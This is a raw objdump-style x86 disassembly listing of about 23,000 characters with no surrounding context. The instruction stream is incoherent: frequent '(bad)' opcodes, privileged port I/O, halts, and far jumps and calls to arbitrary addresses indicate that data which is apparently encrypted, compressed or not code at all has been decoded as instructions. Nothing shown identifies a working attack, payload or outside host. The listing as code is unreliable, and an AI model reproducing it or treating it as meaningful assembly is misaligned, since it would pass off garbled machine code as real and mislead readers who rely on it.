  412fe6:	mov    bl,BYTE PTR [eax-0x78]
  412fe9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fea:	imul   ebx,ebx,0x50
  412fed:	xor    BYTE PTR [esi+0x48ef64cd],bh
  412ff3:	loop   0x412f96
  412ff5:	adc    al,bh
  412ff7:	into   
  412ff8:	mov    eax,ds:0x3ec73ba8
  412ffd:	in     al,0xa9
  412fff:	mov    ecx,0x749a13ca
  413004:	loop   0x412f98
  413006:	inc    esp
  413007:	mov    eax,ds:0x7304c5ae
  41300c:	or     eax,0x16eae1b6
  413011:	cmp    eax,0xd8c27b2d
  413016:	jae    0x413082
  413018:	in     eax,dx
  413019:	cli    
  41301a:	in     eax,dx
  41301b:	out    dx,eax
  41301c:	cmp    DWORD PTR [ebp-0x5],ebx
  41301f:	in     al,dx
  413020:	jle    0x413026
  413022:	lds    edx,FWORD PTR [esi+ebp*2-0x7dd09a5c]
  413029:	data16 adc BYTE PTR [edi+0xc2bf074],0x4f
  413031:	in     al,0x2f
  413033:	ins    BYTE PTR es:[edi],dx
  413034:	add    eax,0xd0dd7a38
  413039:	or     BYTE PTR [ecx+0x1e],bl
  41303c:	std    
  41303d:	(bad)  
  41303e:	jmp    0xaf8c1f53
  413043:	aas    
  413044:	sahf   
  413045:	lahf   
  413046:	out    0xca,al
  413048:	out    dx,eax
  413049:	or     BYTE PTR [ecx+eax*4+0x40],dl
  41304d:	shl    BYTE PTR [edx+0x3d],1
  413050:	aas    
  413051:	shr    BYTE PTR gs:[ebp+0x30283aa6],0xf5
  413059:	loopne 0x4130b3
  41305b:	add    esp,esi
  41305d:	jne    0x413095
  41305f:	cwde   
  413060:	repz je 0x4130a6
  413063:	js     0x413058
  413065:	test   BYTE PTR [ecx],0x54
  413068:	fs inc ecx
  41306a:	icebp  
  41306b:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41306d:	enter  0xab2f,0x13
  413071:	pop    ss
  413072:	loopne 0x413033
  413074:	push   ss
  413075:	push   edi
  413076:	mov    al,0xd5
  413078:	push   0xffffffe8
  41307a:	scas   eax,DWORD PTR es:[edi]
  41307b:	(bad)  
  41307c:	mov    cl,0xce
  41307e:	pop    ebx
  41307f:	sahf   
  413080:	push   0xffffffe4
  413082:	daa    
  413083:	imul   esi,edx,0xffffffdb
  413086:	jl     0x4130f8
  413088:	push   es
  413089:	mov    edi,0xa1635d30
  41308e:	push   cs
  41308f:	ficom  WORD PTR [edi+edi*2+0x40]
  413093:	mov    dh,0x0
  413095:	or     ebx,esi
  413097:	xchg   edi,eax
  413098:	mov    ebp,0xc37e795c
  41309d:	cmp    BYTE PTR [esp+eax*1],dl
  4130a0:	inc    esp
  4130a1:	ret    0x363e
  4130a4:	inc    edi
  4130a5:	jmp    0xcc9ecb2f
  4130aa:	imul   ecx,DWORD PTR [ebx+0x25],0xfffffffb
  4130ae:	cdq    
  4130af:	les    ebx,FWORD PTR [esi+edx*1]
  4130b2:	repnz fldenv [bp+di]
  4130b6:	aas    
  4130b7:	cli    
  4130b8:	xor    al,BYTE PTR [esi+edx*4-0xb]
  4130bc:	loop   0x41310f
  4130be:	fstp   st(7)
  4130c0:	sub    ecx,DWORD PTR [edx]
  4130c2:	call   0x2910:0x34b20eda
  4130c9:	push   esp
  4130ca:	push   ecx
  4130cb:	inc    ecx
  4130cc:	cmp    ah,cl
  4130ce:	or     al,BYTE PTR [esi+0x14]
  4130d1:	add    eax,0x411c28ab
  4130d6:	test   dh,cl
  4130d8:	mov    esp,0x5f95e4d0
  4130dd:	mov    esp,0x31bf7068
  4130e2:	(bad)  
  4130e3:	jae    0x4130d9
  4130e5:	add    eax,DWORD PTR [esi]
  4130e7:	or     DWORD PTR [ebx],esi
  4130e9:	fimul  DWORD PTR [ebp-0x49]
  4130ec:	out    dx,al
  4130ed:	mov    bl,0x45
  4130ef:	(bad)  
  4130f0:	pushf  
  4130f1:	jg     0x413081
  4130f3:	mov    esi,0x6aa2007c
  4130f8:	pop    edx
  4130f9:	sbb    eax,0x384fbe41
  4130fe:	xchg   ebx,eax
  4130ff:	sub    eax,0x644f994e
  413104:	retf   
  413105:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413106:	xor    ecx,DWORD PTR [esi]
  413108:	ror    BYTE PTR [ebx],0x7a
  41310b:	jmp    0xef417167
  413110:	mov    esi,0x41eecc03
  413115:	sub    BYTE PTR [edi+0xc42b7bd],al
  41311b:	push   ss
  41311c:	mov    eax,ds:0xf9ae1f7e
  413121:	sti    
  413122:	(bad)  
  413123:	shr    DWORD PTR [edi],cl
  413125:	xor    DWORD PTR [ebx+0x13],0x1dbca447
  41312c:	lea    edx,[ebp+ebp*2-0x2f013942]
  413133:	cmp    DWORD PTR ds:[esi+0xf],0xffffffdf
  413138:	outs   dx,BYTE PTR ds:[esi]
  413139:	scas   al,BYTE PTR es:[edi]
  41313a:	sub    DWORD PTR [ebx-0x40],eax
  41313d:	iret   
  41313e:	mov    cl,bh
  413140:	mov    DWORD PTR [esp+edi*8],ecx
  413143:	pushf  
  413144:	pop    esp
  413145:	(bad)  
  413146:	repnz stos BYTE PTR es:[edi],al
  413148:	jp     0x41316b
  41314a:	dec    esp
  41314b:	popa   
  41314c:	adc    BYTE PTR [esi+0x35],cl
  41314f:	xchg   esp,eax
  413150:	loop   0x413110
  413152:	cdq    
  413153:	test   al,0x2b
  413155:	out    0x7a,al
  413157:	loopne 0x4131ce
  413159:	in     eax,0x5d
  41315b:	push   edx
  41315c:	mov    fs,WORD PTR ds:0xd4cc3b61
  413162:	push   ss
  413163:	test   eax,0xb4bacc2f
  413168:	in     al,0x69
  41316a:	mov    eax,ds:0x3e2a3ae7
  41316f:	xor    al,0x26
  413171:	xchg   esi,eax
  413172:	or     BYTE PTR [ebx+0x13b771d8],bl
  413178:	xor    al,0xf6
  41317a:	stos   BYTE PTR es:[edi],al
  41317b:	sbb    DWORD PTR ds:0x728370b5,edi
  413181:	outs   dx,BYTE PTR ds:[esi]
  413182:	pusha  
  413183:	bound  ebp,QWORD PTR [edx]
  413185:	mov    bl,0x20
  413187:	in     eax,dx
  413188:	fcomp  QWORD PTR [edx+0x43]
  41318b:	sbb    DWORD PTR [eax],ecx
  41318d:	mov    edi,0xaf72b8b9
  413192:	sahf   
  413193:	les    ebp,FWORD PTR [edx]
  413195:	pop    eax
  413196:	mov    DWORD PTR [eax],ecx
  413198:	mov    edi,0x463af5b7
  41319d:	xchg   esp,eax
  41319e:	das    
  41319f:	loop   0x4131cc
  4131a1:	add    al,0x28
  4131a3:	loopne 0x413135
  4131a5:	icebp  
  4131a6:	scas   al,BYTE PTR es:[edi]
  4131a7:	jg     0x413213
  4131a9:	test   eax,0x30192fcd
  4131ae:	sbb    BYTE PTR [ebx+0x3ffbcd1c],ch
  4131b4:	mov    bl,0x1e
  4131b6:	add    eax,0x3f3f2b53
  4131bb:	rol    cl,0x7e
  4131be:	lea    esp,[ebp-0x1d]
  4131c1:	(bad)  
  4131c2:	mov    ecx,0x419a0056
  4131c7:	push   edi
  4131c8:	aad    0xe6
  4131ca:	out    dx,eax
  4131cb:	fwait
  4131cc:	retf   
  4131cd:	call   0x3ee2221a
  4131d2:	push   ebx
  4131d3:	and    BYTE PTR [ebx+0x2866e48c],0x60
  4131da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131db:	loop   0x413209
  4131dd:	jl     0x41323b
  4131df:	sbb    eax,esp
  4131e1:	test   BYTE PTR [ebx],0x50
  4131e4:	(bad)  
  4131e5:	out    dx,eax
  4131e6:	mov    al,0xe7
  4131e8:	or     DWORD PTR [esi],esi
  4131ea:	lods   eax,DWORD PTR ds:[esi]
  4131eb:	aas    
  4131ec:	or     dl,BYTE PTR [edi]
  4131ee:	aam    0xe2
  4131f0:	xchg   ebp,eax
  4131f1:	out    0x91,al
  4131f3:	sbb    DWORD PTR [esi-0x68668920],0x489a352c
  4131fd:	cli    
  4131fe:	inc    ecx
  4131ff:	pop    edx
  413200:	out    dx,al
  413201:	sub    ebp,DWORD PTR [edx-0x71]
  413204:	fidivr DWORD PTR [edx+0x2e]
  413207:	pop    eax
  413208:	mov    eax,0x74281a72
  41320d:	das    
  41320e:	loop   0x413218
  413210:	(bad)  
  413211:	cmp    al,BYTE PTR [edx-0x71101c5]
  413217:	xor    esi,DWORD PTR [eax+0x7d]
  41321a:	dec    eax
  41321b:	sub    al,0x25
  41321d:	rcl    BYTE PTR [eax-0x1e3b19ed],cl
  413223:	sbb    al,0x40
  413225:	sub    DWORD PTR [ebp+0x3b],ebx
  413228:	adc    al,0x7e
  41322a:	inc    edx
  41322b:	add    DWORD PTR [eax+0x39],0x7a77200c
  413232:	jno    0x4131ee
  413234:	adc    al,0xe0
  413236:	(bad)  
  413237:	xchg   esp,eax
  413238:	stos   DWORD PTR es:[edi],eax
  413239:	cmp    DWORD PTR [ebx-0x18efb7f1],0x64
  413240:	pusha  
  413241:	sub    DWORD PTR [ebx-0x8f129fd],0x5f
  413248:	sahf   
  413249:	jg     0x4132a7
  41324b:	enter  0x6754,0x14
  41324f:	out    dx,eax
  413250:	pop    edi
  413251:	mov    esp,0xb0cc24d6
  413256:	arpl   WORD PTR [ebp+0x50155d8e],bp
  41325c:	ins    BYTE PTR es:[edi],dx
  41325d:	mov    dl,BYTE PTR [ecx-0x50]
  413260:	rcl    BYTE PTR [esi],0x38
  413263:	repz test eax,0xa98a4d59
  413269:	ret    0xadd2
  41326c:	cmc    
  41326d:	inc    ebx
  41326e:	aam    0x1d
  413270:	retf   0x56b3
  413273:	je     0x41320b
  413275:	ss cs test al,dh
  413279:	fidiv  DWORD PTR [edx+0x6c853225]
  41327f:	cmc    
  413280:	xchg   esp,eax
  413281:	loope  0x4132d0
  413283:	ret    0x8396
  413286:	sub    ebp,esp
  413288:	dec    ecx
  413289:	cmp    DWORD PTR [ebx+0x5f],esi
  41328c:	mov    bh,0x83
  41328e:	(bad)  
  41328f:	loope  0x4132dc
  413291:	sub    DWORD PTR [eax-0x2f95ff90],esp
  413297:	mov    esp,0x5e4e1613
  41329c:	sar    bh,0x76
  41329f:	aaa    
  4132a0:	leave  
  4132a1:	mov    edx,0xe1d6dbe6
  4132a6:	and    edx,DWORD PTR [ebx]
  4132a8:	cmp    al,0xd1
  4132aa:	sub    DWORD PTR [edi],0x9aaca8e6
  4132b0:	test   eax,0xd69a6bef
  4132b5:	or     eax,0x23a4bf4b
  4132ba:	into   
  4132bb:	das    
  4132bc:	cwde   
  4132bd:	mov    ebx,0xf0c33cc3
  4132c2:	or     eax,0x3649094c
  4132c7:	repz sub ecx,DWORD PTR [edi]
  4132ca:	sub    eax,0xfb463780
  4132cf:	(bad)  
  4132d0:	mov    ch,0xee
  4132d2:	pop    ds
  4132d3:	rcr    BYTE PTR [ebp-0x18],0xfe
  4132d7:	cmp    al,0x40
  4132d9:	jae    0x4132f3
  4132db:	out    0xd8,eax
  4132dd:	fs jle 0x413311
  4132e0:	cmp    edi,esp
  4132e2:	lock pop edx
  4132e4:	sub    edx,eax
  4132e6:	ret    
  4132e7:	inc    ecx
  4132e8:	jno    0x41332e
  4132ea:	int    0xda
  4132ec:	jbe    0x41332f
  4132ee:	mov    esi,0xc1a2b9ae
  4132f3:	and    dh,BYTE PTR [ebx+0x2]
  4132f6:	cmp    ah,0x49
  4132f9:	lock je 0x413300
  4132fc:	jmp    0x9a004547
  413301:	or     eax,DWORD PTR [ecx+0x7dbb65e9]
  413307:	push   ds
  413308:	fdiv   QWORD PTR [ecx]
  41330a:	pop    edx
  41330b:	mov    dl,0x5f
  41330d:	pop    esi
  41330e:	imul   ebx,DWORD PTR [esi+0x61fdcbaf],0x11f1691d
  413318:	jnp    0x4132bc
  41331a:	fidiv  WORD PTR [esi]
  41331c:	hlt    
  41331d:	adc    BYTE PTR [edi],bh
  41331f:	popf   
  413320:	sub    BYTE PTR [ecx+0x72],al
  413323:	and    BYTE PTR [ebx],cl
  413325:	push   ss
  413326:	inc    ebp
  413327:	cs jle 0x413354
  41332a:	add    eax,0x728e92ef
  41332f:	lds    esi,FWORD PTR [esi+0x7f6c03f]
  413335:	inc    edx
  413336:	push   eax
  413337:	push   ds
  413338:	outs   dx,DWORD PTR ds:[esi]
  413339:	and    al,0xea
  41333b:	sbb    eax,0x94de685a
  413340:	aad    0x4a
  413342:	jo     0x413304
  413344:	mov    ds:0x888c0242,al
  413349:	adc    ebp,esp
  41334b:	jecxz  0x413310
  41334d:	retf   
  41334e:	sub    ch,BYTE PTR [edx-0x5e]
  413351:	sahf   
  413352:	mov    ebp,0xb1d659a1
  413357:	xchg   ecx,eax
  413358:	pushf  
  413359:	jmp    0x6ad1:0x2d99753d
  413360:	aaa    
  413361:	call   0xd85d:0xeecd0841
  413368:	fistp  WORD PTR [eax-0x39]
  41336b:	ficomp WORD PTR [ecx+ebp*8-0x194b88b1]
  413372:	retf   
  413373:	jge    0x4133e8
  413375:	sbb    al,BYTE PTR [ecx]
  413377:	sub    al,0xca
  413379:	xor    dh,0xaa
  41337c:	add    ecx,DWORD PTR [ebp+0x37184a54]
  413382:	cdq    
  413383:	sahf   
  413384:	xchg   cl,cl
  413386:	je     0x413365
  413388:	mov    edx,0x58d899cc
  41338d:	and    BYTE PTR [edi],ch
  41338f:	outs   dx,DWORD PTR ds:[esi]
  413390:	or     BYTE PTR [esi+0x5e],dh
  413393:	adc    BYTE PTR [ebx-0x7e],bl
  413396:	add    ecx,DWORD PTR [ebp+0x75]
  413399:	sub    al,0xcc
  41339b:	sbb    al,0x62
  41339d:	mov    bl,0xe7
  41339f:	lods   al,BYTE PTR ds:[esi]
  4133a0:	aad    0x5b
  4133a2:	mov    bl,0xc0
  4133a4:	mov    ds:0xa58b7f68,al
  4133a9:	push   edx
  4133aa:	adc    dh,BYTE PTR [eax-0x6e4837bb]
  4133b0:	sub    DWORD PTR [ebx-0x1d],ebx
  4133b3:	hlt    
  4133b4:	inc    esp
  4133b5:	jbe    0x4133f3
  4133b7:	pushf  
  4133b8:	into   
  4133b9:	rcr    DWORD PTR [edi+0x6c688f47],0x2c
  4133c0:	mov    ah,0x9
  4133c2:	in     eax,dx
  4133c3:	mov    dl,0xca
  4133c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133c6:	lock pop ebp
  4133c8:	sti    
  4133c9:	or     edi,DWORD PTR [edx+0xfc60304]
  4133cf:	mov    DWORD PTR [ecx+0x72],esi
  4133d2:	xchg   ebp,eax
  4133d3:	(bad)  
  4133d4:	loopne 0x4133c7
  4133d6:	jnp    0x4133f0
  4133d8:	jg     0x413452
  4133da:	sub    eax,0x89f3b3f7
  4133df:	pop    es
  4133e0:	inc    ecx
  4133e1:	sub    al,0x6f
  4133e3:	ins    DWORD PTR es:[edi],dx
  4133e4:	inc    eax
  4133e5:	stos   BYTE PTR es:[edi],al
  4133e6:	pusha  
  4133e7:	jecxz  0x413383
  4133e9:	or     BYTE PTR ds:0xf7d0ea3d,al
  4133ef:	push   edx
  4133f0:	leave  
  4133f1:	xchg   esi,eax
  4133f2:	scas   al,BYTE PTR es:[edi]
  4133f3:	jmp    0x413378
  4133f5:	mov    ch,0x1e
  4133f7:	test   eax,0x47fd0fd
  4133fc:	les    eax,FWORD PTR ss:[eax+eiz*2+0x19c973b]
  413404:	sar    BYTE PTR [eax-0x5b0caba8],1
  41340a:	test   eax,0x37b989d7
  41340f:	dec    esp
  413410:	cmp    BYTE PTR [edx+0x7f],dh
  413413:	inc    ecx
  413414:	cld    
  413415:	fdiv   st(2),st
  413417:	xor    dh,BYTE PTR [eax+0x6c0cbfca]
  41341d:	loope  0x413467
  41341f:	gs push ebp
  413421:	sahf   
  413422:	add    ah,BYTE PTR [edi-0x9aab301]
  413428:	fist   WORD PTR [eax-0x79]
  41342b:	jno    0x4133cb
  41342d:	mov    ch,0x38
  41342f:	aas    
  413430:	aas    
  413431:	dec    ebx
  413432:	jae    0x4133f6
  413434:	sbb    DWORD PTR [ecx+0x44],edi
  413437:	pop    ebx
  413438:	push   es
  413439:	addr16 pop ds
  41343b:	cs (bad) 
  41343d:	or     al,0x96
  41343f:	(bad)  
  413440:	mov    ah,0x79
  413442:	pop    esi
  413443:	into   
  413444:	mov    WORD PTR [eax-0x2d],gs
  413447:	pop    ebp
  413448:	nop
  413449:	lods   al,BYTE PTR ds:[esi]
  41344a:	inc    esp
  41344b:	xor    eax,0xb023aee8
  413450:	ds pop edx
  413452:	ret    0xdbed
  413455:	fimul  DWORD PTR [eax-0x56]
  413458:	mov    eax,ds:0x8818bd2b
  41345d:	push   ebp
  41345e:	in     al,dx
  41345f:	scas   eax,DWORD PTR es:[edi]
  413460:	jge    0x413459
  413462:	popa   
  413463:	hlt    
  413464:	out    0x4a,eax
  413466:	pop    ds
  413467:	mov    edx,0xa9553480
  41346c:	lock xor edi,DWORD PTR es:0xda484d2e
  413474:	mov    cl,0xb8
  413476:	inc    esp
  413477:	xchg   esi,eax
  413478:	pop    ebx
  413479:	mov    dl,0x5d
  41347b:	adc    BYTE PTR [ebx+0x6d],cl
  41347e:	xchg   edx,ecx
  413480:	push   ecx
  413481:	sub    eax,DWORD PTR [eax+0x72687575]
  413487:	mov    edi,ebx
  413489:	fcomp  QWORD PTR [ebp-0x68]
  41348c:	cmp    ch,al
  41348e:	inc    esp
  41348f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413490:	nop
  413491:	dec    edi
  413492:	call   0x5d4d6993
  413497:	xchg   edx,eax
  413498:	mov    cl,bl
  41349a:	or     BYTE PTR [ecx+0x6f03eec0],dh
  4134a0:	sub    eax,0xa5b9b75f
  4134a5:	and    eax,0x2e267d9e
  4134aa:	jge    0x413497
  4134ac:	xor    eax,0x9016db5b
  4134b1:	shr    DWORD PTR [ecx+0x1029a238],0xd5
  4134b8:	dec    ecx
  4134b9:	mov    eax,ds:0xc9398830
  4134be:	cmp    al,0x5e
  4134c0:	or     BYTE PTR ds:0xc1a16aca,al
  4134c6:	adc    edx,esp
  4134c8:	ss call 0x3762:0xbfa94cac
  4134d0:	dec    eax
  4134d1:	sar    esp,cl
  4134d3:	xchg   esi,eax
  4134d4:	retf   
  4134d5:	sbb    cl,ah
  4134d7:	test   BYTE PTR [esi+ebx*4-0x55],ch
  4134db:	jno    0x413506
  4134dd:	idiv   BYTE PTR [eax]
  4134df:	or     edx,esp
  4134e1:	mov    ch,0x4f
  4134e3:	or     dh,BYTE PTR [edx+0x40]
  4134e6:	in     eax,0xbc
  4134e8:	retf   
  4134e9:	imul   ebp,DWORD PTR [ecx-0x58],0x594eb3ec
  4134f0:	xchg   esp,eax
  4134f1:	push   DWORD PTR es:[edx+0x21]
  4134f5:	dec    eax
  4134f6:	xchg   esp,eax
  4134f7:	sti    
  4134f8:	cmp    eax,0xb9f04ab5
  4134fd:	xchg   DWORD PTR [esi-0x4a],esi
  413500:	sub    bl,BYTE PTR [edi]
  413502:	retf   
  413503:	jb     0x41354f
  413505:	(bad)  
  413507:	mov    edx,0x99471406
  41350c:	adc    eax,0x145374d2
  413511:	pop    eax
  413512:	outs   dx,BYTE PTR ds:[esi]
  413513:	adc    al,0x8e
  413515:	js     0x4134ba
  413517:	and    dh,dl
  413519:	jp     0x413508
  41351b:	outs   dx,DWORD PTR ds:[esi]
  41351c:	cwde   
  41351d:	adc    eax,0xd9d2dae8
  413522:	mov    edi,DWORD PTR [edi+0x5f]
  413525:	out    0xf,ax
  413528:	push   ds
  413529:	dec    ebp
  41352a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41352b:	in     eax,0x11
  41352d:	push   ss
  41352e:	stc    
  41352f:	jo     0x4134f9
  413531:	inc    eax
  413532:	mov    ebp,es
  413534:	mov    dl,BYTE PTR [ebp+0x6f]
  413537:	dec    ebx
  413538:	mov    eax,ds:0x841e6df1
  41353d:	jb     0x4134f8
  41353f:	int3   
  413540:	aas    
  413541:	ins    DWORD PTR es:[edi],dx
  413542:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413543:	clc    
  413544:	jns    0x41358f
  413546:	call   0xa899f63e
  41354b:	cld    
  41354c:	fwait
  41354d:	in     al,dx
  41354e:	push   edx
  41354f:	inc    eax
  413550:	mov    ebx,0xbd0a9867
  413555:	mov    es,edx
  413557:	push   es
  413558:	gs scas eax,DWORD PTR es:[edi]
  41355a:	jl     0x41356c
  41355c:	cmp    al,0x1e
  41355e:	cld    
  41355f:	cmc    
  413560:	lahf   
  413561:	jmp    0xc85a:0xb1e7206e
  413568:	sub    eax,0x91bdcee8
  41356d:	int    0x79
  41356f:	jnp    0x41350a
  413571:	cmp    eax,0x6c3813e6
  413576:	push   0xa94b1471
  41357b:	pop    eax
  41357c:	fs lahf 
  41357e:	and    ebx,DWORD PTR [ecx-0x7dbfc1c4]
  413584:	test   eax,0xa839a597
  413589:	aaa    
  41358a:	imul   eax,DWORD PTR [esi+0x6e13b3fa],0x3801e332
  413594:	sbb    ebp,edi
  413596:	push   ebx
  413597:	xchg   bl,bh
  413599:	push   edi
  41359a:	(bad)  
  41359c:	push   eax
  41359d:	mov    dl,BYTE PTR [edi-0x55]
  4135a0:	std    
  4135a1:	xchg   ebx,eax
  4135a2:	jae    0x413527
  4135a4:	int3   
  4135a5:	rcr    DWORD PTR [ebp-0x690f4334],1
  4135ab:	mov    ebx,0x6af03b14
  4135b0:	add    BYTE PTR [edx-0x1],dh
  4135b3:	fisubr DWORD PTR [ebp+0x6960f673]
  4135b9:	scas   eax,DWORD PTR es:[edi]
  4135ba:	loop   0x4135f1
  4135bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135bd:	arpl   WORD PTR [eax-0x66],bx
  4135c0:	cdq    
  4135c1:	and    al,0xcd
  4135c3:	outs   dx,DWORD PTR es:[esi]
  4135c5:	out    0xbb,al
  4135c7:	jno    0x41359e
  4135c9:	ss mov ch,0x2c
  4135cc:	test   BYTE PTR [ecx+0x4553dba2],dh
  4135d2:	push   edx
  4135d3:	es push esp
  4135d5:	vmread DWORD PTR [ecx-0x4f],ecx
  4135d9:	jmp    0x4bf69de3
  4135de:	sub    al,BYTE PTR [ebp+0x12]
  4135e1:	loopne 0x413604
  4135e3:	je     0x4135a8
  4135e5:	push   ss
  4135e6:	push   eax
  4135e7:	out    dx,al
  4135e8:	or     edx,esp
  4135ea:	js     0x4135aa
  4135ec:	xor    al,BYTE PTR [edx-0x3752a259]
  4135f2:	push   eax
  4135f3:	jle    0x413633
  4135f5:	jbe    0x41363d
  4135f7:	pop    ss
  4135f8:	jle    0x41362d
  4135fa:	fs stc 
  4135fc:	pusha  
  4135fd:	jecxz  0x413593
  4135ff:	push   ecx
  413600:	ror    DWORD PTR [edx],0xc5
  413603:	mov    ebp,0xc4419a55
  413608:	mov    edi,0xa143e6a9
  41360d:	dec    esi
  41360e:	push   ebp
  41360f:	push   0xcb71587b
  413614:	js     0x41361a
  413616:	jecxz  0x413598
  413618:	out    dx,eax
  413619:	xor    dl,BYTE PTR [edx-0x11d8a16e]
  41361f:	mov    ds:0xfa41ee55,eax
  413624:	push   cs
  413625:	pop    ss
  413626:	cli    
  413627:	stos   DWORD PTR es:[edi],eax
  413628:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413629:	test   DWORD PTR [esi-0x74],esp
  41362c:	pop    ds
  41362d:	cld    
  41362e:	into   
  41362f:	xchg   ebp,eax
  413630:	inc    edx
  413631:	(bad)  [ebp+0x66]
  413634:	add    al,0x3b
  413636:	test   eax,0x34a89a7
  41363b:	xor    cl,ah
  41363d:	out    dx,eax
  41363e:	(bad)  
  41363f:	cwde   
  413640:	pop    edi
  413641:	add    DWORD PTR [ebx],0x62
  413644:	or     BYTE PTR [edx],ch
  413646:	addr16 or bh,dh
  413649:	sbb    cl,al
  41364b:	mov    ch,0x70
  41364d:	sub    bl,BYTE PTR [ebx+eax*1-0x7aa9730b]
  413654:	daa    
  413655:	aas    
  413656:	dec    ebx
  413657:	test   al,0x91
  413659:	push   0xfffffff8
  41365b:	pop    ecx
  41365c:	push   ds
  41365d:	and    edi,DWORD PTR [edi]
  41365f:	sar    BYTE PTR [ecx-0x17155422],cl
  413665:	add    BYTE PTR [ebp-0x6],cl
  413668:	fstp   QWORD PTR [ebx+ebx*8+0x24]
  41366c:	sbb    eax,eax
  41366e:	cmp    DWORD PTR [ebp+0x37],edx
  413671:	ss and ch,0x77
  413675:	mov    ebx,0xbde2ac1f
  41367a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41367b:	and    eax,0x4a7fd28
  413680:	lea    ebp,[eax]
  413682:	xor    al,0x11
  413684:	jg     0x4136ff
  413686:	mov    ecx,0x31dbd86d
  41368b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41368c:	(bad)  
  41368e:	pop    ebp
  41368f:	aad    0x74
  413691:	aam    0x65
  413693:	mov    WORD PTR [ebx-0x2ba0833d],es
  413699:	fwait
  41369a:	or     DWORD PTR [ecx-0x3acc36e1],edi
  4136a0:	scas   al,BYTE PTR es:[edi]
  4136a1:	lds    esi,FWORD PTR [esi-0x75]
  4136a4:	xchg   ebp,eax
  4136a5:	push   ss
  4136a6:	sbb    DWORD PTR [edx-0x6cfba51],ebp
  4136ac:	in     eax,0xfe
  4136ae:	or     al,0x71
  4136b0:	jbe    0x413674
  4136b2:	(bad)  
  4136b3:	mov    edx,0x7547708e
  4136b8:	fst    QWORD PTR [ebx+edx*1+0x2030ea30]
  4136bf:	daa    
  4136c0:	mov    es,WORD PTR [edx]
  4136c2:	shl    BYTE PTR [ebp-0x24566ba3],1
  4136c8:	ret    0x6bdf
  4136cb:	test   esi,edi
  4136cd:	mov    ds:0x8b828281,eax
  4136d2:	aad    0xe2
  4136d4:	icebp  
  4136d5:	pop    ecx
  4136d6:	xchg   esi,eax
  4136d7:	rol    BYTE PTR [ebp+edx*1+0x3f91f91d],0x1b
  4136df:	into   
  4136e0:	xor    al,0xc6
  4136e2:	jb     0x41374b
  4136e4:	and    eax,0xe09fb4ae
  4136e9:	xor    ch,bl
  4136eb:	or     al,0x40
  4136ed:	dec    esp
  4136ee:	lods   eax,DWORD PTR ds:[esi]
  4136ef:	das    
  4136f0:	test   esi,edi
  4136f2:	call   0x7f19dee
  4136f7:	js     0x413742
  4136f9:	imul   eax,DWORD PTR [edi+eax*2-0x1d],0xffffffd5
  4136fe:	nop
  4136ff:	adc    ebx,esi
  413701:	mov    eax,0x11ce100a
  413706:	cmp    bl,bl
  413708:	js     0x413781
  41370a:	and    eax,ebp
  41370c:	mov    bl,0x2f
  41370e:	ficomp DWORD PTR [ebx]
  413710:	sahf   
  413711:	lahf   
  413712:	(bad)  
  413714:	jno    0x413725
  413716:	outs   dx,DWORD PTR ds:[esi]
  413717:	xor    al,0x78
  413719:	sub    eax,0x55dc0f36
  41371f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413720:	push   ds
  413721:	xchg   esi,eax
  413722:	ss xor cl,al
  413725:	fmul   QWORD PTR [ebx+0x70459d28]
  41372b:	lock dec esi
  41372d:	dec    esp
  41372e:	hlt    
  41372f:	pop    ds
  413730:	mov    WORD PTR [eax],fs
  413732:	jb     0x41374f
  413734:	or     edx,DWORD PTR es:[edi+0x69d20388]
  41373b:	int    0x4f
  41373d:	aaa    
  41373e:	sub    al,0x37
  413740:	cmp    DWORD PTR [edx],esp
  413742:	sub    BYTE PTR [eax],ah
  413744:	jecxz  0x41377f
  413746:	xchg   ebx,eax
  413747:	cmp    al,BYTE PTR [eax]
  413749:	in     eax,dx
  41374a:	xor    eax,0xf66cd9d3
  41374f:	stos   BYTE PTR es:[edi],al
  413750:	sub    BYTE PTR [edi+0x79],bh
  413753:	adc    BYTE PTR [ecx],0xc7
  413756:	jae    0x4137b1
  413758:	sub    ch,al
  41375a:	sub    al,0xd9
  41375c:	cmp    DWORD PTR [ebx],ecx
  41375e:	jg     0x413708
  413760:	scas   eax,DWORD PTR es:[edi]
  413761:	push   0x6d
  413763:	sbb    dh,bh
  413765:	xchg   ecx,eax
  413766:	mov    dl,BYTE PTR [ebx]
  413768:	mov    esp,0x83f58e74
  41376d:	xor    bh,BYTE PTR [ecx+0x3f6beb42]
  413773:	inc    edx
  413774:	call   0xeda5d798
  413779:	popa   
  41377a:	dec    edx
  41377b:	mov    dh,0xc2
  41377d:	and    ah,ch
  41377f:	jl     0x4137f3
  413781:	cli    
  413782:	add    eax,0xe5aef2a1
  413787:	or     DWORD PTR [ecx+0x28caccdc],esi
  41378d:	js     0x41377a
  41378f:	jl     0x413763
  413791:	sbb    edi,DWORD PTR [esi+0x1dd70b0f]
  413797:	xor    cl,ch
  413799:	jmp    0x323e787b
  41379e:	dec    eax
  41379f:	inc    esp
  4137a0:	test   eax,0xf56ec54a
  4137a5:	xchg   ebp,eax
  4137a6:	push   edi
  4137a7:	push   esi
  4137a8:	lea    ebp,[ecx+0x34]
  4137ab:	nop
  4137ac:	xor    eax,0x297b9eca
  4137b1:	sti    
  4137b2:	mov    al,ds:0x24979efe
  4137b7:	mov    BYTE PTR [eax-0x7b10d05a],bl
  4137bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137be:	cwde   
  4137bf:	lea    eax,[ecx]
  4137c1:	and    eax,0x5d961b1c
  4137c6:	mov    WORD PTR ss:[ebp+0x71],gs
  4137ca:	pop    ss
  4137cb:	imul   eax,esp,0x2139b1eb
  4137d1:	pop    ss
  4137d2:	sub    BYTE PTR [edi],ah
  4137d4:	and    eax,0x6f728fdf
  4137d9:	repz jmp 0x670f:0x5faa3d8f
  4137e1:	(bad)  
  4137e2:	out    dx,al
